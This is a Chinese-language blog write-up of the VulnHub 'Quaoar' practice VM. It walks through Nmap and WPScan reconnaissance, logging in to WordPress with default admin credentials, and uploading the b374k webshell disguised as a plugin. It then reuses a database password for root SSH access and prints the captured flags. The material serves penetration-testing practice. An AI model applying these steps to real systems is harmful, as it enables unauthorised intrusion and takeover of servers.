---
title: 'VulnHub #Quaoar'
metaAlignment: center
coverMeta: out
thumbnailImagePosition: left
date: 2017-09-13 14:09:46
categories:
  - Writeups
  - VulnHub
thumbnailImage: cover.png
keywords:
  - vulnhub
  - writeup
  - quaoar
tags:
  - Writeups
---
hackfest2016: Quaoar
<!-- more -->
## 目標
VulnHub：[Quaoar](https://www.vulnhub.com/entry/hackfest2016-quaoar,180/)
Local Victim Quaoar IP: 192.168.31.54
1. Get a shell
2. Get root access
3. There is a post exploitation flag on the box

## 偵查
VM 開起來以後唯一的資訊就是一個 IP，第一件事就先拿去 Nmap 看一看開啟了哪些對外的服務。
```
root@kali:~# nmap -sS 192.168.31.54

Starting Nmap 7.60 ( https://nmap.org ) at 2017-09-13 06:37 UTC
Nmap scan report for 192.168.31.54
Host is up (0.011s latency).
Not shown: 991 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
993/tcp open  imaps
995/tcp open  pop3s

Nmap done: 1 IP address (1 host up) scanned in 2.18 seconds
```

太棒了，80 port 有開一個 http 的服務，web 可能會是很好的一個攻擊入口。不過用瀏覽器一看只有兩張圖片而已。只好進入例行步驟看看有哪些路徑，我自己習慣先看看有沒有`robots.txt`，在這裡還真的藏了 Wordpress 在裡面。
![robots.txt](robots.png)

順帶一提，也可以利用`Burp Suite`或是`OWASP ZAP`的`Spider`功能來爬整個網站的連結，就可以很清楚看到大部分的東西。
![burp](burp.png)

知道有一個 Wordpress 網站後，我再使用`WPScan`來檢查這個 Wordpress 站點有沒有什麼弱點。（因為檢查結果滿多的就不整個複製貼上了。）
```
root@kali:~# wpscan -u 192.168.31.54/wordpress
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9.3
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.31.54/wordpress/
[+] Started: Wed Sep 13 06:57:36 2017

[!] The WordPress 'http://192.168.31.54/wordpress/readme.html' file exists exposing a version number
[+] Interesting header: SERVER: Apache/2.2.22 (Ubuntu)
[+] Interesting header: X-POWERED-BY: PHP/5.3.10-1ubuntu3
[+] XML-RPC Interface available under: http://192.168.31.54/wordpress/xmlrpc.php
[!] Upload directory has directory listing enabled: http://192.168.31.54/wordpress/wp-content/uploads/
[!] Includes directory has directory listing enabled: http://192.168.31.54/wordpress/wp-includes/

[+] WordPress version 3.9.14 (Released on 2016-09-07) identified from advanced fingerprinting, meta generator, readme, links opml, stylesheets numbers
[!] 15 vulnerabilities identified from the version number
...
```

總體而言有不少 CVE 弱點被檢查出來，不過我比較在意的是 Wordpress 的登入功能，舊的版本說不定會有預設密碼這種弱點，再用 WPScan 加上猜測常見使用者的參數：
```
root@kali:~# wpscan -u 192.168.31.54/wordpress --enumerat user
...
[+] Enumerating usernames ...
[+] Identified the following 2 user/s:
    +----+--------+--------+
    | Id | Login  | Name   |
    +----+--------+--------+
    | 1  | admin  | admin  |
    | 2  | wpuser | wpuser |
    +----+--------+--------+
[!] Default first WordPress username 'admin' is still used
...
```
結果竟然有預設的`admin`帳號仍然還在使用中，當然第一個就先猜密碼也是`admin`，一試就成功。
![dashboard](dashboard.png)

## 滲透
有了 Wordpress 的管理權限後，再來得思考如何取得這台伺服器的控制權。Wordpress 有擴充 Plugin 的功能，而且可以上傳自製的 Plugin，或許可以利用安裝自訂 Plugin 的功能來上傳一個 webshell。寫一個 Wordpress Plugin 不難，可以參考官方這篇[文章](https://codex.wordpress.org/Writing_a_Plugin)，只要有一些基本的描述就可以改造成最基本的 Plugin。

這裡我用有名的[b374k](https://github.com/b374k/b374k)來修改成符合 Wordpress Plugin 的格式，基本上只要在開頭加些 Plugin 描述後再包成`ZIP`就可以上傳。
```php
<?php
/*
Plugin Name: b374k
Description: a simple webshell
Version: 1.0
*/
/*
	b374k shell 3.2.3
	Jayalah Indonesiaku
	(c)2014
	https://github.com/b374k/b374k

*/
.....
```
![upload](upload.png)

上傳成功以後，Plugin的路徑位在`/wp-content/plugins/PLUGIN_NAME/xxx.php`，例如這次的路徑`/wp-content/plugins/b374k/b374k.php`，輸入預設密碼`b374k`後就可以成功進入 webshell。
![webshell](webshell.png)

基本上到這邊已經成功上傳了一個 webshell 而且找到了位在`/home/wpadmin/flag.txt`的第一個 flag。
![flag](flag.png)

## root
雖然有了 webshell 就可以辦到很多事，但能拿下伺服器的 root 才算是掌握了伺服器的操作權。

有裝過 Wordpress 的就會知道有個`wp-config.php`的檔案會儲存一些重要設定，例如帳號密碼。的確找到了 MySQL 的 root 密碼，抱著姑且一試的心態打這個密碼去做 SSH 登入，沒想到竟然成功了，system root 的密碼竟然跟 MySQL root 一樣，不愧是難度 Vary Easy 的 vm，沒有特別刁難... 同時也找到了第二個 flag 在 `/root/flag.txt`。
![root](root.png)

```
root@kali:~# ssh root@192.168.31.54
root@192.168.31.54's password:
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Wed Sep 13 04:10:59 EDT 2017

  System load:  0.16              Processes:             97
  Usage of /:   29.9% of 7.21GB   Users logged in:       0
  Memory usage: 39%               IP address for eth0:   192.168.31.54
  Swap usage:   10%               IP address for virbr0: 192.168.122.1

  Graph this data and manage this system at https://landscape.canonical.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Wed Sep 13 04:09:53 2017 from 192.168.31.193
root@Quaoar:~# cat flag.txt
8e3f9ec016e3598c5eec11fd3d73f6fb
```

## Final flag
最後一個 flag 我一直沒有頭緒藏在哪裡，看來官方給的一些 Walkthrough 才知道，原來這要考的是進入伺服器之後要檢查 crontab 的習慣，很多時候滲透進伺服器後會利用 crontab 來反彈 shell。而檢查也不單純只是下個`$ crontab -l`的方法，這個會有瑕疵，只會列出目前使用者 (root) 的 crontab，最保險的做法還是得自己到`/etc/cron.d`底下看看全部的 crontab。的確有一個`/etc/cron.d/php5`的檔案，最後一個 flag 就在這裡面。
```
root@Quaoar:/etc/cron.d# cat php5
# /etc/cron.d/php5: crontab fragment for php5
#  This purges session files older than X, where X is defined in seconds
#  as the largest value of session.gc_maxlifetime from all your php.ini
#  files, or 24 minutes if not defined.  See /usr/lib/php5/maxlifetime
# Its always a good idea to check for crontab to learn more about the operating system good job you get 50! - d46795f84148fd338603d0d6a9dbf8de
# Look for and purge old sessions every 30 minutes
09,39 *     * * *     root   [ -x /usr/lib/php5/maxlifetime ] && [ -d /var/lib/php5 ] && find /var/lib/php5/ -depth -mindepth 1 -maxdepth 1 -type f -cmin +$(/usr/lib/php5/maxlifetime) ! -execdir fuser -s {} 2>/dev/null \; -delete
```

## 結語
第一次玩這種 vulnerable vm 的 CTF，有別於單純的線上 CTF 解題，更需要全面的思考和執行，我覺得更能夠練習到完整地滲透測試，從偵查、滲透到提權，一步一步的掌握整個伺服器。以後該多多練習這方面的挑戰。